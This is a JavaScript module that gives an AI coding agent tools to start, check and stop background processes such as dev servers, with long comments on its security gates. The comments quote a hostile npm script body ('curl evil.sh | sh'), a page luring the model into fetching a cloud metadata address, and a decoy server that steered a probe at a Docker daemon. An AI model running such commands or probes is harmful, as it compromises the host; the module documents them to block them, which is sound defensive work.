/**
 * ── ⭐⭐ THE CLI COULD RUN THINGS THAT FINISH. NOTHING THAT KEEPS RUNNING ────
 *
 * `run_command` blocks until the process exits and kills it at a timeout. That
 * is correct for `npm test` and it makes an entire class of work impossible:
 * **you cannot start a dev server.** Not slow — impossible. So the agent could
 * write a Next.js app and never once see it serve a request, which is the gap
 * between "generates a page" and "builds a thing that runs".
 *
 * ⚠️ AND `fetch_url` CANNOT REACH IT EITHER. `fetch-text.mjs` refuses loopback
 * and private addresses, deliberately and correctly — that guard exists so a
 * page the model was told to read cannot talk it into fetching `169.254.169.254`
 * or an internal admin panel. Relaxing it would trade a real security property
 * for a convenience.
 *
 * ⭐ SO THE PROBE LIVES HERE INSTEAD, AND IS SAFE FOR A DIFFERENT REASON: it
 * only ever connects to **a port this module started itself**, on loopback.
 * Not "loopback is allowed now" — "this specific port, because we launched the
 * thing listening on it". A capability the model cannot aim anywhere else.
 *
 * ⚠️⚠️ THAT SENTENCE WAS A LIE UNTIL 2026-08-15, and it is worth reading twice
 * because it is the shape of the mistake, not just the mistake. The port was
 * "discovered from that process's own output" — so the thing being defended
 * against was supplying the number. An adversarial pass proved it end to end: a
 * decoy printed `"Docker daemon on port 2375"` while binding something else,
 * and the probe went to the real Docker daemon. `verifyPortOwner` now asks the
 * OS who holds the port before anything opens a socket. ⭐ The guard existed,
 * was documented, was tested, and was checking a fact the attacker controlled.
 *
 * ── ⚠️⚠️ ORPHANS ARE THE FAILURE MODE, AND THIS REPO HAS ALREADY PAID ───────
 *
 * `command.mjs` records it: `npm test` left pid 13128 running with its parent
 * already gone — a true orphan, until reboot, on the owner's personal laptop.
 * A BACKGROUND process is that same shape by definition, so:
 *
 * 1. every process is registered the moment it spawns, before anything can throw;
 * 2. `process.once('exit')` plus SIGINT/SIGTERM/SIGBREAK kill the whole registry
 *    — the pattern `lsp.mjs:507` already uses, because 'exit' does NOT fire on a
 *    signal and a Ctrl-C that leaves three dev servers running is the bug;
 * 3. the killer is `killProcessTree` IMPORTED from `command.mjs`, never a second
 *    copy — the Windows `taskkill /T` and POSIX negative-pid branches are both
 *    non-obvious and both were learned from a real orphan.
 *
 * ── ⚠️ AND IT IS THE SAME ALLOWLIST ────────────────────────────────────────
 *
 * This does not get its own permission model. `--no-run` withholds it, a dry run
 * refuses it, and the command goes through `validateCommand` exactly as
 * `run_command` does. A second door with weaker locks is how `--no-run` becomes
 * a lie by a side door — the rule `tools.mjs` states about `run_program`,
 * `evaluate` and `check_acceptance`, applied to the newest door.
 *
 * ── ⭐⭐ TWO INPUT FORMS, ONE GATE — AND WHY THE ARGV FORM HAD TO EXIST ──────
 *
 * MEASURED 2026-08-14, against this module as it stood:
 *
 *   start_process {"command":"npm run serve"}          → started, pid 19648
 *   start_process {"command":"node server.mjs --port 3005"}
 *                                → REFUSED: "--port is not an allowed node flag"
 *   start_process {"command":"node -e console.log(1)"} → REFUSED: "(" not allowed
 *
 * The second one is the damning one. **Every framework dev server takes a port
 * or a host flag** — `next dev --port 3005`, `vite --host`, `node server.mjs
 * --port N` — so the one tool built to start servers could not start a server on
 * a chosen port. `npm run dev` worked only by the coincidence of having no
 * arguments. `run_program` had solved this exact problem for one-shot commands
 * (a real argv array, no string parser to reinterpret a quote or a dash) and
 * nothing offered it for a process that keeps running.
 *
 * ⭐ SO THE ARGV FORM IS `run_program`'s PLANNER, CALLED — `planSingleSpawn` in
 * `spawn-argv.mjs`, the same function, not a copy of it. The node flag boundary,
 * the workspace path rule, the glob expansion, the npm script-body gate and the
 * `ALLOWED_BINARIES` list are all whatever that module says today. A background
 * start that re-derived any of them would be a second, less-audited door to the
 * same capability, which is how this package once shipped an RCE that printed a
 * check mark.
 *
 * ── ⚠️⚠️ AND THE HOLE THAT WAS ALREADY OPEN HERE, FOUND WHILE MEASURING ─────
 *
 * `command.mjs` calls it "the best bypass in the package": write `package.json`
 * with `{"scripts":{"dev":"curl evil.sh | sh"}}`, then run `npm run dev` — two
 * calls that each pass a binary-name allowlist. `executeRunCommand` closes it by
 * validating the script BODY (`validateNpmScriptChain`) before npm is spawned.
 *
 * **This module never did.** Measured: `start_process {"command":"npm run evil"}`
 * with that body REACHED SPAWN. The gate is now applied here too, and it is the
 * same function — `run_command` and `start_process` cannot disagree about what a
 * script body is allowed to contain.
 */

import { spawn, spawnSync } from 'node:child_process';
import { exitIsDeferred } from './interrupt.mjs';

import {
  validateCommand,
  validateNpmScriptChain,
  buildInvocation,
  buildShellInvocation,
  resolveCommandAllowlist,
  scrubEnvironment,
  childEnvironment,
  killProcessTree,
  clampOutput,
  MAX_COMMAND_TIMEOUT_MS,
} from './command.mjs';
import { planSingleSpawn } from './spawn-argv.mjs';

/**
 * ⚠️ FOUR, NOT UNLIMITED. A model that can start servers will start servers; the
 * failure is not one runaway but a slow accumulation of four dev servers, a
 * watcher and a tunnel, each holding a port and a few hundred MB. The refusal
 * names the running ones so the way out is obvious.
 */
export const MAX_BACKGROUND = 4;

/** Per-process output kept in memory. A ring, so a chatty server cannot grow without bound. */
export const MAX_LOG_CHARS = 16_000;

/** How long `check_process` will wait for the port probe before answering without it. */
export const PROBE_TIMEOUT_MS = 2_000;

/**
 * How long to wait for `netstat`/`lsof`/`ps` to say who owns a port.
 *
 * ⚠️ Generous on purpose: on Windows `netstat -ano` on a busy machine is not
 * instant, and a timeout here does NOT fall back to trusting the process — it
 * refuses to probe. So a mean timeout costs a working feature, not a hole.
 */
export const PORT_OWNER_TIMEOUT_MS = 5_000;

/**
 * ⭐ HOW A PORT IS DISCOVERED: from what the process SAYS, not from a guess.
 * Every dev server prints its URL — that line is the contract, and reading it
 * beats assuming 3000 (which is wrong the moment two servers run, and Next.js
 * itself silently moves to 3001).
 *
 * ⚠️ ORDER MATTERS: a full URL is matched before a bare `:port`, or
 * `http://localhost:3000` would yield the port from the wrong pattern half the
 * time depending on which ran first.
 */
export const PORT_PATTERNS = Object.freeze([
  /https?:\/\/(?:localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]):(\d{2,5})/i,
  /\blistening\b[^\n]*?\bport\b\D{0,10}(\d{2,5})/i,
  /\bport\b\D{0,10}(\d{2,5})/i,
  /(?:^|\s):(\d{4,5})\b/,
]);

/**
 * The live registry. Module-level on purpose: the exit hooks below must be able
 * to reach every process regardless of which session started it, and a session
 * that throws must not be able to take the registry down with it.
 * @type {Map<string, object>}
 */
const live = new Map();
let counter = 0;

/** Kill everything, best effort, never throwing. The one function the hooks call. */
export function stopAllBackground() {
  for (const rec of [...live.values()]) {
    try { killProcessTree(rec.child); } catch { /* already gone */ }
    rec.running = false;
  }
  live.clear();
}

/**
 * ⚠️ REGISTERED ONCE, AT MODULE LOAD, AND NOT INSIDE A SESSION. `turn.mjs`
 * documents why: registering inside the run means a second run adds a second
 * listener, and 'exit' does not fire on a signal at all. Both hooks are needed —
 * neither covers the other.
 */
let hooked = false;
function installExitHooks() {
  if (hooked) return;
  hooked = true;
  process.once('exit', stopAllBackground);
  for (const [sig, code] of [['SIGINT', 130], ['SIGTERM', 143], ['SIGBREAK', 149]]) {
    try {
      process.once(sig, () => {
        stopAllBackground();
        // ⚠️ Cleanup ALWAYS runs; only the exit is deferrable. A first Ctrl-C
        // asks the run to stop at its round boundary — see lib/interrupt.mjs —
        // but the children this module owns are reaped either way, because a
        // deferred exit is not a reason to leave a process tree behind.
        if (!exitIsDeferred()) process.exit(code);
      });
    } catch { /* SIGBREAK does not exist off Windows */ }
  }
}

/** Append to a process's ring buffer. */
function record(rec, chunk) {
  rec.log += chunk;
  if (rec.log.length > MAX_LOG_CHARS) {
    rec.truncated = true;
    rec.log = rec.log.slice(-MAX_LOG_CHARS);
  }
  if (rec.port === null) rec.port = detectPort(rec.log);
}

/**
 * ── ⚠️⚠️ THE PORT A PROCESS **CLAIMED**. NOT A PORT WE KNOW IT HOLDS ────────
 *
 * The comment here used to read: *"Exported because 'we only probe a port we
 * started' is a security claim, and it is only true if this is testable."*
 * The claim was **false**, and no amount of testing this function could have
 * shown it — the function is correct; its INPUT is the problem.
 *
 * This reads the child's own STDOUT. A repository somebody cloned decides what
 * its `npm run dev` prints, so a repository decides this number. Proven end to
 * end by an adversarial pass: a decoy server bound one port while printing
 * `"Docker daemon on port 2375"`, `listBackground()` duly reported
 * `{"port":2375}`, and a probe was aimed at the real Docker daemon — whose API
 * on 2375 is unauthenticated and will mount the host filesystem into a
 * container. The module header's boast, *"this specific port, because we
 * launched the thing listening on it"*, was the one sentence that was untrue.
 *
 * ⭐ SO THIS RETURNS A CLAIM, AND IT IS NAMED AS ONE. `verifyPortOwner` turns
 * the claim into a fact by asking the OPERATING SYSTEM who is listening. No
 * caller that touches the network may use the claim without that check.
 *
 * @param {string} text
 * @returns {number|null}
 */
export function detectPort(text) {
  if (typeof text !== 'string' || text === '') return null;
  for (const pattern of PORT_PATTERNS) {
    const m = pattern.exec(text);
    if (!m) continue;
    const port = Number(m[1]);
    // ⚠️ A "port" of 0, 80 or 65536 out of a log line is almost certainly a
    // version number or a byte count. Dev servers live above 1024.
    if (Number.isInteger(port) && port > 1024 && port <= 65535) return port;
  }
  return null;
}

/**
 * ── ⭐⭐ WHO ACTUALLY HOLDS THIS PORT — ASKED OF THE OS, NOT OF THE CHILD ────
 *
 * `detectPort` reads a number the child chose. This asks the kernel which
 * process is listening on it, and answers whether that process is the one this
 * run started.
 *
 * ⚠️ IT DEGRADES TO `verified:false`, NEVER TO `owned:true`. If netstat/lsof is
 * absent, times out, or prints a shape we do not recognise, the answer is "I
 * could not check" — and a caller must treat that as a refusal, exactly as
 * `gateNpmScript` above treats an unreadable `package.json`. "I could not check
 * it" and "it is fine" are different answers and only one of them is honest.
 *
 * ⚠️ AND IT IS NOT ON THE HOT PATH. It spawns a process, so it runs when a port
 * is about to be USED, not on every chunk of output. `record()` still stores the
 * claim; `checkBackground` is where the claim has to become a fact.
 *
 * @param {number} port
 * @param {number|null} pid the process this run started
 * @param {{spawnImpl?: Function, platform?: string, timeoutMs?: number}} [opts]
 * @returns {{owned: boolean, verified: boolean, owner: number|null, why: string}}
 */
export function verifyPortOwner(port, pid, { spawnImpl = spawnSync, platform = process.platform, timeoutMs = PORT_OWNER_TIMEOUT_MS } = {}) {
  const n = Number(port);
  if (!Number.isInteger(n) || n <= 0 || n > 65535) {
    return { owned: false, verified: true, owner: null, why: `${port} is not a port number` };
  }
  const root = Number(pid);
  if (!Number.isInteger(root) || root <= 0) {
    return { owned: false, verified: false, owner: null, why: 'the process this run started has no pid, so nothing can be matched against it' };
  }

  const tool = platform === 'win32' ? 'netstat' : 'lsof';
  let out = null;
  try {
    const r = platform === 'win32'
      ? spawnImpl('netstat', ['-ano', '-p', 'TCP'], { encoding: 'utf8', windowsHide: true, timeout: timeoutMs })
      : spawnImpl('lsof', [`-iTCP:${n}`, '-sTCP:LISTEN', '-nP', '-Fp'], { encoding: 'utf8', timeout: timeoutMs });
    if (r && r.status === 0 && typeof r.stdout === 'string') out = r.stdout;
  } catch {
    out = null;
  }
  if (out === null) {
    return {
      owned: false,
      verified: false,
      owner: null,
      why: `could not ask this machine who is listening on ${n} (${tool} did not answer), and the port was read from a process's own output`,
    };
  }

  const owners = platform === 'win32' ? winListeners(out, n) : posixListeners(out);
  if (owners.length === 0) {
    return { owned: false, verified: true, owner: null, why: `nothing is listening on ${n} yet` };
  }

  /**
   * ⭐ THE PROCESS WE STARTED, **OR ONE OF ITS DESCENDANTS**. A dev server forks:
   * `npm run dev` spawns node, which spawns the real server, so the listener is
   * usually a grandchild. An exact-pid rule would refuse nearly every real
   * Next.js and Vite server — and a guard that fails correct work gets switched
   * off, which this package calls the worse failure.
   */
  const family = descendantsOf(root, { spawnImpl, platform, timeoutMs });
  const hit = owners.find((o) => o === root || family.has(o));
  if (hit !== undefined) {
    return { owned: true, verified: true, owner: hit, why: `pid ${hit} is listening on ${n} and belongs to the process this run started` };
  }
  return {
    owned: false,
    verified: true,
    owner: owners[0],
    why: `port ${n} belongs to pid ${owners[0]}, which this run did NOT start — the number came from a process's own output, and a repository decides what its dev server prints`,
  };
}

/** LISTENING rows of `netstat -ano`, for one port, as owning pids. */
function winListeners(text, port) {
  const pids = [];
  for (const line of String(text).split(/\r?\n/)) {
    if (!/\bLISTENING\b/i.test(line)) continue;
    // `TCP    0.0.0.0:3002    0.0.0.0:0    LISTENING    11192` — and the IPv6
    // form `[::]:3002`, whose colons are why the address is matched as a lump
    // and the port taken from the LAST colon rather than by splitting.
    const m = /^\s*TCP\s+(\S+):(\d+)\s+\S+\s+LISTENING\s+(\d+)/i.exec(line);
    if (!m) continue;
    if (Number(m[2]) !== port) continue;
    const pid = Number(m[3]);
    if (Number.isInteger(pid) && !pids.includes(pid)) pids.push(pid);
  }
  return pids;
}

/** `lsof -Fp` prints one `p<pid>` line per owner; the port was in the query. */
function posixListeners(text) {
  const pids = [];
  for (const line of String(text).split(/\r?\n/)) {
    const m = /^p(\d+)$/.exec(line.trim());
    if (!m) continue;
    const pid = Number(m[1]);
    if (Number.isInteger(pid) && !pids.includes(pid)) pids.push(pid);
  }
  return pids;
}

/**
 * Every descendant pid of `pid`, best effort.
 *
 * ⚠️ BEST EFFORT MEANS SMALLER, NEVER LARGER. If the process table cannot be
 * read the set comes back EMPTY, so `verifyPortOwner` refuses rather than
 * accepts. A guess that widened the family would be a guess that widened the
 * hole, and the whole point of this file today is that the permissive default
 * was the bug.
 */
export function descendantsOf(pid, { spawnImpl = spawnSync, platform = process.platform, timeoutMs = PORT_OWNER_TIMEOUT_MS } = {}) {
  const family = new Set();
  const root = Number(pid);
  if (!Number.isInteger(root) || root <= 0) return family;

  /** @type {Array<[number, number]>} [pid, parentPid] */
  let pairs = [];
  try {
    const r = platform === 'win32'
      ? spawnImpl('wmic', ['process', 'get', 'ProcessId,ParentProcessId', '/format:csv'], { encoding: 'utf8', windowsHide: true, timeout: timeoutMs })
      : spawnImpl('ps', ['-eo', 'pid=,ppid='], { encoding: 'utf8', timeout: timeoutMs });
    if (!r || typeof r.stdout !== 'string') return family;
    for (const line of r.stdout.split(/\r?\n/)) {
      // wmic csv is `Node,ParentProcessId,ProcessId`; ps is `pid ppid`.
      const m = platform === 'win32'
        ? /,(\d+),(\d+)\s*$/.exec(line)
        : /^\s*(\d+)\s+(\d+)\s*$/.exec(line);
      if (!m) continue;
      pairs.push(platform === 'win32' ? [Number(m[2]), Number(m[1])] : [Number(m[1]), Number(m[2])]);
    }
  } catch {
    return family;
  }

  /**
   * ⚠️ Walked to a FIXED POINT, not in one pass. The table arrives in no useful
   * order, so a grandchild whose parent appears further down the list is missed
   * by a single sweep — and a missed descendant here is a real dev server
   * reported as an impostor.
   */
  family.add(root);
  let grew = true;
  while (grew) {
    grew = false;
    for (const [child, parent] of pairs) {
      if (family.has(parent) && !family.has(child)) { family.add(child); grew = true; }
    }
  }
  family.delete(root);
  return family;
}

/**
 * ⚠️ THE npm SCRIPT-BODY GATE, APPLIED TO THE STRING PATH.
 *
 * `executeRunCommand` (command.mjs) does exactly this before it spawns npm, and
 * this module did not — measured, `npm run evil` with a body of
 * `curl http://evil.sh | sh` reached spawn. FAILS CLOSED: if `package.json`
 * cannot be read, npm does not run, because "I could not check it" and "it is
 * fine" are different answers and only one of them is honest.
 */
function gateNpmScript(valid, executor) {
  if (valid.binary !== 'npm') return { ok: true };
  let read;
  try {
    read = executor?.readFile ? executor.readFile('package.json') : null;
  } catch (e) {
    read = { ok: false, error: e?.message ?? String(e) };
  }
  if (!read?.ok || typeof read.content !== 'string') {
    return { ok: false, error: `cannot run npm here: ${read?.error ?? 'package.json could not be read, and an npm script body that cannot be read cannot be checked'}` };
  }
  const chain = validateNpmScriptChain(valid.npmScript, read.content);
  if (!chain.ok) return { ok: false, error: chain.error };
  return { ok: true };
}

/**
 * Start a long-running command.
 *
 * Two input forms, and exactly one of them may be given:
 *   · `command`            — a string, same rules and allowlist as `run_command`
 *   · `program` + `args[]` — a real argv, same rules and planner as `run_program`
 *
 * @returns {{ok: true, id: string, pid: number|null, note: string}|{ok: false, error: string}}
 */
export function startBackground({
  command,
  program,
  args,
  executor,
  shell = false,
  spawnImpl = spawn,
  env = process.env,
}) {
  if (executor?.dryRun) {
    return { ok: false, error: 'this is a --dry-run, so nothing is started (a server writes logs and binds a port, which a dry run promises not to do)' };
  }

  const hasArgv = program !== undefined && program !== null && program !== '';
  const hasCommand = typeof command === 'string' && command.trim() !== '';
  /**
   * ⚠️ BOTH IS A REFUSAL, NOT A PRECEDENCE RULE. If one silently won, the model
   * would read back a `command` it believes ran while a different argv actually
   * did — and `check_process` would show the winner, so the mistake would look
   * like the tool lying rather than like a malformed call.
   */
  if (hasArgv && hasCommand) {
    return { ok: false, error: 'give either "command" (a string) or "program" + "args" (a real argv), not both. The argv form is the one to use when an argument contains a space, a quote, or a leading dash.' };
  }
  if (!hasArgv && !hasCommand) {
    return { ok: false, error: 'start_process needs something to start: "command" (e.g. "npm run dev"), or "program" + "args" (e.g. program "node", args ["server.mjs","--port","3005"]).' };
  }

  if (live.size >= MAX_BACKGROUND) {
    const names = [...live.values()].map((r) => `${r.id} (${r.command})`).join(', ');
    return {
      ok: false,
      error: `${MAX_BACKGROUND} background processes are already running: ${names}. `
        + 'Stop one with stop_process before starting another — each holds a port and memory until this run ends.',
    };
  }

  /**
   * ⚠️ THE SAME PATHS `executeRunCommand` AND `runProgram` USE, AND NONE OF THEM
   * SHARE A VALIDATOR. `command.mjs` states the reason: a validator that
   * sometimes validates is the shape that produces a "safe" mode which quietly
   * is not.
   */
  let invocation;
  /** What the audit line, the cap refusal and `check_process` will show. */
  let label = typeof command === 'string' ? command : '';
  /** The logical argv, present only for the argv form — the receipt that proves
   *  `"buy milk"` survived as ONE slot, which is the fact a string can never show. */
  let argv = null;

  if (hasArgv) {
    /**
     * ⭐ THE ARGV FORM NEEDS NO SHELL AND IS NOT GIVEN ONE, even under `--shell`.
     * There is no string for a shell to reinterpret, so routing it through one
     * would only ADD a parser — strictly more surface for strictly no gain.
     */
    const plan = planSingleSpawn({ root: executor?.root, program, args });
    if (!plan.ok) return { ok: false, error: plan.error };
    invocation = { ok: true, file: plan.file, args: plan.spawnArgs };
    argv = plan.argv;
    label = JSON.stringify(plan.argv);
  } else if (shell) {
    invocation = buildShellInvocation(command);
    if (!invocation.ok) return { ok: false, error: invocation.error };
  } else {
    let allowlist;
    try {
      const configText = executor?.readFile ? (executor.readFile('.acuvo/commands.json')?.content ?? null) : null;
      allowlist = resolveCommandAllowlist({ configText, envValue: env.ACUVO_ALLOW_COMMANDS }).allowlist;
    } catch {
      allowlist = undefined;
    }
    const valid = validateCommand(command, allowlist ? { allowlist } : {});
    if (!valid.ok) return { ok: false, error: valid.error };
    const gated = gateNpmScript(valid, executor);
    if (!gated.ok) return gated;
    invocation = buildInvocation(valid, executor.root);
    if (invocation.ok === false) return { ok: false, error: invocation.error };
  }

  counter += 1;
  const id = `bg${counter}`;
  const rec = {
    id,
    command: label,
    argv,
    log: '',
    truncated: false,
    port: null,
    /**
     * Has the OS confirmed this process (or a descendant) holds `port`?
     * `null` = not asked yet. Only `true` permits a probe — see
     * `checkBackground`, and `detectPort` for why the claim alone is worthless.
     */
    portOwned: null,
    portOwnerWhy: null,
    portOwnerVerified: null,
    running: true,
    exitCode: null,
    signal: null,
    startedAt: Date.now(),
    child: null,
  };

  installExitHooks();
  /**
   * ⚠️ REGISTERED BEFORE THE SPAWN CAN THROW. If `spawn` fails after a pid
   * exists but before we record it, that pid is an orphan nothing can reach.
   */
  live.set(id, rec);

  try {
    const child = spawnImpl(invocation.file, invocation.args, {
      cwd: executor.root,
      /**
       * ⚠️ `childEnvironment` — a background process is a child like any
       * other, and a long-running one that shells out to npm is the same
       * escalation the one-shot road had. Given the argv so an npm dev server
       * (`npm run dev`) keeps its pre/post hooks; see `childEnvironment`.
       */
      env: childEnvironment({ file: invocation.file, args: invocation.args }, env),
      windowsHide: true,
      // POSIX: its own process group, so a negative-pid kill reaches the tree.
      detached: process.platform !== 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    rec.child = child;
    child.stdout?.setEncoding?.('utf8');
    child.stderr?.setEncoding?.('utf8');
    child.stdout?.on?.('data', (c) => record(rec, String(c)));
    child.stderr?.on?.('data', (c) => record(rec, String(c)));
    child.on?.('error', (e) => { record(rec, `\n[spawn error] ${e?.message ?? e}\n`); rec.running = false; });
    /**
     * ── ⚠️⚠️ `exit` RECORDS THE CODE; `close` DECIDES IT IS OVER ─────────────
     *
     * FOUND BY A FAILING TEST, and it would have been a miserable bug in the
     * field. `exit` fires when the process ends — but its stdout and stderr may
     * still hold buffered data, so a `check_process` racing in at that instant
     * reports `running:false, exitCode:1` with **empty output**: the crash is
     * announced and the reason for it is gone. That is the single most valuable
     * moment this tool has, and it was the one that could arrive blank.
     *
     * `close` fires only after every stdio stream is drained, so treating THAT
     * as "it is over" guarantees the exit code and the error message arrive
     * together. `exit` still records the code, because `close` does not always
     * carry it.
     */
    child.on?.('exit', (code, signal) => {
      rec.exitCode = code;
      rec.signal = signal;
    });
    child.on?.('close', (code, signal) => {
      rec.running = false;
      if (rec.exitCode === null) rec.exitCode = code;
      if (!rec.signal) rec.signal = signal;
    });

    return {
      ok: true,
      id,
      pid: child?.pid ?? null,
      note: `started in the background as ${id}. It keeps running while you do other things. `
        + `Call check_process {"id":"${id}"} in a later round to read its output and find out which port it bound — `
        + 'a server usually needs a second or two before it is listening.',
    };
  } catch (e) {
    live.delete(id);
    return { ok: false, error: `could not start it: ${e?.message ?? e}` };
  }
}

/**
 * Is the port this process announced actually accepting connections?
 *
 * ⚠️ THE ONLY NETWORK CALL IN THIS FILE, AND IT IS BOUNDED THREE WAYS: loopback
 * only, a port we started, and a timeout. It reports a REACHABILITY fact, never
 * a body — this is not a back door to fetching pages.
 */
async function probePort(port, { timeoutMs = PROBE_TIMEOUT_MS, fetchImpl = fetch } = {}) {
  if (!Number.isInteger(port)) return null;
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetchImpl(`http://127.0.0.1:${port}/`, { signal: ac.signal, redirect: 'manual' });
    return { reachable: true, status: res.status };
  } catch (e) {
    return { reachable: false, why: e?.name === 'AbortError' ? 'no answer within the timeout' : (e?.message ?? String(e)) };
  } finally {
    clearTimeout(timer);
  }
}

/**
 * What a background process has done since it started.
 * @returns {Promise<object>}
 */
export async function checkBackground(id, { probe = probePort, verifyOwner = verifyPortOwner } = {}) {
  const rec = live.get(id);
  if (!rec) {
    const known = [...live.keys()];
    return {
      ok: false,
      error: known.length === 0
        ? 'no background process with that id — none are running. Start one with start_process.'
        : `no background process "${id}". Running now: ${known.join(', ')}.`,
    };
  }

  const clamped = clampOutput(rec.log);
  const out = {
    ok: true,
    id,
    command: rec.command,
    /** ⭐ Present only for the argv form, and it is the receipt: it shows each
     *  argument in its own slot, so a model can SEE that `--port 3005` arrived as
     *  two arguments to the script rather than as a node flag. */
    ...(rec.argv ? { argv: rec.argv } : {}),
    running: rec.running,
    uptimeMs: Date.now() - rec.startedAt,
    port: rec.port,
    /**
     * ⚠️ FLATTENED ON PURPOSE. `clampOutput` returns `{text, truncated,
     * omitted}`, and passing that object straight through gives the model a
     * nested shape to unwrap before it can read a stack trace — plus a second
     * `truncated` beside it meaning something subtly different (the ring buffer
     * dropped old lines vs this reply dropped the tail). One string, one flag.
     */
    output: clamped.text,
    truncated: rec.truncated || clamped.truncated === true,
  };

  /**
   * ⚠️⚠️ A PROCESS THAT DIED ON STARTUP MUST NOT READ AS "STARTING UP". This is
   * the whole reason `check_process` reports an exit code rather than just
   * `running:false`: a server that crashed because the port was taken and a
   * server that is still booting look identical from the outside, and a model
   * that cannot tell them apart waits politely forever for a dead process.
   */
  if (!rec.running) {
    out.exitCode = rec.exitCode;
    out.signal = rec.signal;
    out.note = rec.exitCode === 0
      ? 'it exited cleanly. If you expected a server, it stopped on its own — read the output above.'
      : `it is NOT running: it exited with code ${rec.exitCode}${rec.signal ? ` (signal ${rec.signal})` : ''}. `
        + 'This is a failure to fix, not a slow start — the output above is why.';
    return out;
  }

  if (rec.port !== null) {
    /**
     * ── ⚠️⚠️ THE CLAIM IS CHECKED HERE, BEFORE ANYTHING TOUCHES THE NETWORK ──
     *
     * `rec.port` came out of the child's stdout, so a cloned repository chose
     * it (see `detectPort`). Asking the OS who holds the port is what makes the
     * module header's promise — "a port we started" — actually true.
     *
     * ⚠️ VERIFIED ONCE, THEN REMEMBERED. Each check spawns netstat/ps, and
     * `check_process` is called every round while a server boots. A confirmed
     * ownership does not change (the pid held it and we are still running), so
     * it is cached; a NEGATIVE is not cached, because "nothing is listening
     * yet" is the normal state of a server three seconds into starting.
     */
    if (rec.portOwned !== true) {
      const v = verifyOwner(rec.port, rec.child?.pid ?? null);
      rec.portOwned = v?.owned === true;
      rec.portOwnerWhy = v?.why ?? 'unknown';
      rec.portOwnerVerified = v?.verified === true;
    }

    out.portVerified = rec.portOwned === true;
    if (!rec.portOwned) {
      /**
       * ⚠️ NO PROBE, AND THE REASON IS SAID OUT LOUD. Falling through to the
       * probe "just to be helpful" is precisely the hole: one GET to a port a
       * repository named is a service-existence oracle today, and the same
       * number reaches `http-probe`'s POST path the day that module is wired.
       */
      out.note = `it is running, but the port in its output (${rec.port}) was NOT confirmed to belong to it: `
        + `${rec.portOwnerWhy}. Nothing was probed. `
        + 'If the server is still starting, check again in a later round.';
      return out;
    }

    const p = await probe(rec.port);
    out.probe = p;
    out.url = `http://localhost:${rec.port}/`;
    out.note = p?.reachable
      ? `it is listening: HTTP ${p.status} on ${out.url}`
      : `it announced port ${rec.port} but is not answering yet (${p?.why ?? 'unknown'}). Check again in a later round.`;
  } else {
    out.note = 'it is running but has not announced a port yet. If it is a server, check again in a later round; '
      + 'if it is a watcher or a build, the output above is all there is.';
  }
  return out;
}

/** Stop one. Idempotent: stopping something already gone is a success. */
export function stopBackground(id) {
  const rec = live.get(id);
  if (!rec) return { ok: false, error: `no background process "${id}". Running now: ${[...live.keys()].join(', ') || '(none)'}.` };
  try { killProcessTree(rec.child); } catch { /* already gone */ }
  rec.running = false;
  live.delete(id);
  return { ok: true, id, stopped: true, output: clampOutput(rec.log).text };
}

/** For tests and for the summary — never mutate the returned array. */
export function listBackground() {
  return [...live.values()].map((r) => ({
    id: r.id, command: r.command, running: r.running, port: r.port, exitCode: r.exitCode,
    /**
     * ⚠️⚠️ CARRIED SO CONSUMERS CANNOT MISS IT. `http-probe.mjs` finds the
     * owner of a port by matching `p.port === wantPort` against this list, and
     * `port` alone is a number a cloned repository printed. Anything that opens
     * a socket must require `portVerified === true`, not merely a match.
     */
    portVerified: r.portOwned === true,
  }));
}

export const BACKGROUND_TOOL_NAMES = ['start_process', 'check_process', 'stop_process'];

export function backgroundToolSchemas() {
  return [
    {
      type: 'function',
      function: {
        name: 'start_process',
        description: [
          'Start a long-running command that KEEPS RUNNING while you do other things — a dev server,',
          'a watcher, a build in watch mode. Use this instead of run_command for anything that does not exit',
          'on its own: run_command waits for the process to finish and kills it at a timeout, so starting a',
          'server with it can only ever time out.',
          'TWO WAYS TO SAY WHAT TO START, and you must give exactly one.',
          '(1) command: a plain string, e.g. "npm run dev" — same rules and allowlist as run_command, which',
          'means no shell, so a quote, a paren or a program flag like --port is refused.',
          '(2) program + args: a REAL argument array, exactly like run_program — use this whenever any',
          'argument has a space, a quote or a leading dash. program "node", args ["server.mjs","--port","3005"]',
          'is how you start a server on a port you chose; args after the script path are passed to your',
          'program untouched. program "npm", args ["run","dev","--","--port","3005"] passes them to the script.',
          'Returns an id. Call check_process with that id in a LATER round to read its output and find out',
          'which port it bound. Everything started this way is killed automatically when this run ends.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            command: { type: 'string', description: 'The command as ONE string, e.g. "npm run dev". Same rules and allowlist as run_command. Leave this out if you are using program + args.' },
            program: { type: 'string', enum: ['node', 'npm', 'npx', 'tsc'], description: 'The argv form: the program to run. Nothing else is reachable.' },
            args: {
              type: 'array',
              items: { type: 'string' },
              description: 'One argument per array item, e.g. ["server.mjs","--port","3005"] or ["run","dev","--","--host"]. Never put two arguments in one string.',
            },
          },
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'check_process',
        description: [
          'Read what a background process has printed, whether it is still running, and — if it announced',
          'a port — whether it is actually answering HTTP on localhost.',
          'This is how you find out that the server is up before you try to use it, and how you find out it',
          'died on startup instead of waiting for something that is never coming.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: { id: { type: 'string', description: 'The id returned by start_process, e.g. "bg1".' } },
          required: ['id'],
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'stop_process',
        description: 'Stop a background process and everything it started. Returns its final output.',
        parameters: {
          type: 'object',
          properties: { id: { type: 'string', description: 'The id returned by start_process.' } },
          required: ['id'],
        },
      },
    },
  ];
}

/** Dispatch. Mirrors the shape every other tool module in this package uses. */
export async function runBackgroundTool(name, args = {}, { executor, shell = false, env = process.env } = {}) {
  switch (name) {
    case 'start_process':
      /**
       * ⚠️ NOT `String(args.command ?? '')` ANY MORE. Coercing an absent
       * `command` to `''` made "no command given" indistinguishable from "the
       * empty command", and with two input forms that difference is the whole
       * decision — `startBackground` has to be able to see that the caller sent
       * `program` instead. Passed through as-is; the refusals live there.
       */
      return startBackground({
        command: args.command,
        program: args.program,
        args: args.args,
        executor,
        shell,
        env,
      });
    case 'check_process':
      return checkBackground(String(args.id ?? ''));
    case 'stop_process':
      return stopBackground(String(args.id ?? ''));
    default:
      return { ok: false, error: `unknown background tool "${name}"` };
  }
}
